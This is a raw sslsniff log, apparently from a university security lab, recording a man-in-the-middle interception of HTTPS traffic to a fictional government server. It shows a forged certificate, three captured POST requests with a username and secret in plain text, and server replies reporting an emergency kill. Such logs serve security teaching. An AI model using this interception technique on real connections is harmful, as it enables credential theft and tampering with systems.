1493981794 INFO sslsniff : Certificate Ready: data.gov-of-caltopia.info
1493981816 DEBUG sslsniff : New intercept, source 10.161.161.131:34518 <-> destination 52.53.60.98:443
1493981816 DEBUG sslsniff : Read from Client (data.gov-of-caltopia.info) :
POST /update HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

user=cs161-aqz&secret=ef2c24b4288b7245&emergency_kill=false

1493981816 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
HTTP/1.0 200 OK
Date: Fri, 05 May 2017 10:56:56 GMT
Content-Length: 81
Content-Type: text/html
Server: TwistedWeb/17.1.0


1493981816 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
<html>Kill command received. Emergency kill initiated! Disabling system...</html>
1493981847 DEBUG sslsniff : New intercept, source 10.161.161.131:34522 <-> destination 52.53.60.98:443
1493981847 DEBUG sslsniff : Read from Client (data.gov-of-caltopia.info) :
POST /update HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

user=cs161-aqz&secret=ef2c24b4288b7245&emergency_kill=false

1493981847 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
HTTP/1.0 200 OK
Date: Fri, 05 May 2017 10:57:27 GMT
Content-Length: 81
Content-Type: text/html
Server: TwistedWeb/17.1.0


1493981847 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
<html>Kill command received. Emergency kill initiated! Disabling system...</html>
1493981877 DEBUG sslsniff : New intercept, source 10.161.161.131:34526 <-> destination 52.53.60.98:443
1493981877 DEBUG sslsniff : Read from Client (data.gov-of-caltopia.info) :
POST /update HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 61

user=cs161-aqz&secret=ef2c24b4288b7245&emergency_kill=false

1493981877 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
HTTP/1.0 200 OK
Date: Fri, 05 May 2017 10:57:57 GMT
Content-Length: 81
Content-Type: text/html
Server: TwistedWeb/17.1.0


1493981877 DEBUG sslsniff : Read from Server (data.gov-of-caltopia.info) :
<html>Kill command received. Emergency kill initiated! Disabling system...</html>
